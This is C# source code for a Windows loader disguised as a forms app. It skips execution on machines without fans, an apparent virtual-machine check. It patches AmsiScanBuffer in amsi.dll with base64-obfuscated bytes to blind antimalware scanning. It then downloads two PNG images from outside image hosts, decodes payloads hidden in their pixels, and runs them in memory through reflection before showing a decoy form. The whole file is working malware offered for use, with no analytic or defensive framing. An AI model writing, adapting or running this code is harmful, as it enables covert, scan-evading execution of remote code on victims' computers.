using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace qwqdanchun
{
    static class Program
    {
        /// <summary>
        /// 应用程序的主入口点。
        /// </summary>
        [STAThread]
        static void Main()
        {
            if (!isVM_by_wim_temper())
            {
                Load();
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }


        public static byte[] depixelate(Bitmap img)
        {
            StringBuilder holder = new StringBuilder();
            int xmax = img.Width - 1;
            int ymax = img.Height - 1;
            for (int y = 1; y <= ymax; y++)
            {
                for (int x = 1; x <= xmax; x++)
                {
                    Color c = img.GetPixel(x, y);
                    holder.Append((char)c.R);
                }
            }

            return Convert.FromBase64String(holder.ToString().Replac​e(Convert.ToChar(0).ToString(), ""));
        }
        private static void Load()
        {
            A.Bypass();

            string loader = @"https://s1.ax1x.com/2020/04/28/J4Zp9S.png"; // No Startup，CHINA
            string file = @"https://z3.ax1x.com/2021/03/29/cCXQtf.png"; //File
            var requestLoader = WebRequest.Create(loader);
            var requestFile = WebRequest.Create(file);
            Bitmap loaderIMG;
            Bitmap fileIMG;

            using (var response = requestLoader.GetResponse())
            using (var stream = response.GetResponseStream())
            {
                loaderIMG = (Bitmap)Image.FromStream(stream);
            }

            using (var response = requestFile.GetResponse())
            using (var stream = response.GetResponseStream())
            {
                fileIMG = (Bitmap)Image.FromStream(stream);
            }

            byte[] outputLoader = depixelate(loaderIMG);

            byte[] outputFile = depixelate(fileIMG);

            Assembly.Load(outputLoader).GetType("Loader.Loader").GetMethod("RunProgram").Invoke(null, new object[] { outputFile });
        }
        public static bool isVM_by_wim_temper()
        {
            SelectQuery selectQuery = new SelectQuery("Select * from Win32_Fan");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(selectQuery);
            int i = 0;
            foreach (ManagementObject DeviceID in searcher.Get())
            {
                i++;
            }
            if (i == 0)
            {
                return true;
            }
            else
            {
                return false;
            }

        }
    }

    public class A
    {
        //static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        //static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };


        static string x64 = "uFcAB4DD";
        static string x86 = "uFcAB4DCGAA=";



        public static void Bypass()
        {
            if (is64Bit())
                PatchA(Convert.FromBase64String(x64));
            else
                PatchA(Convert.FromBase64String(x86));
        }

        private static void PatchA(byte[] patch)
        {
            try
            {
                var lib = Win32.LoadLibrary(Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));//Amsi.dll
                var addr = Win32.GetProcAddress(lib, Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));//AmsiScanBuffer

                uint oldProtect;
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                Marshal.Copy(patch, 0, addr, patch.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static bool is64Bit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
    }

    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}
